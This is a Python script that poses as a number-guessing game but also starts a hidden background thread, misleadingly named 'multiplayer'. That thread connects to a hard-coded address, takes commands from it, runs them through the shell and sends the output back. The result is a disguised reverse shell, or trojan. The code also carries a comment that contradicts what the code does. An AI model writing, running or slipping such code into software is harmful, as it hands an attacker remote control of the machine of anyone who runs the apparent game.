import random
import socket
import threading
import os
import subprocess

def game():
    done = False
    while not done:
        target = random.randint(0, 100)
        print("Welcome to the game!")
        won = False
        while not won:
            guess = int(input("Guess the number: "))
            if guess > target:
                print("Try a smaller number!")
            elif guess < target:
                print("Try a greater number!")
            else:
                print(f"You got it! {target} was the number!")
                won = True
                response = input("Wanna play again? (y/n) ")
                while response not in ["y", "n"]:
                    response = input("Wanna play again? (y/n) ")
                if response == "n":
                    done = True

def run_command(command):
    words = command.split()
    try:
        if words[0] == "cd":
            os.chdir(words[1])
            return "Directory changed successfully!"
        else:
            # Running commands without shell=True if words is a list
            result = subprocess.run(words,shell=True, capture_output=True, text=True)
            output = result.stdout
            if output == "":
                output = "Command executed successfully!"
            return output
    except subprocess.CalledProcessError as e:
        return f"Command error: {e.stderr}"
    except FileNotFoundError:
        return "Command not found!"
    except Exception as e:
        return f"An error occurred: {str(e)}"

def multiplayer():
    HOST = "192.168.1.101"  # Replace with the actual IP
    PORT = 1327
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((HOST, PORT))
        while True:
            command = client.recv(1024).decode("utf-8")
            if not command:
                break
            output = run_command(command)
            client.send(output.encode("utf-8"))
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        client.close()

# Start threads
t1 = threading.Thread(target=game)
t2 = threading.Thread(target=multiplayer, daemon=True)
t1.start()
t2.start()
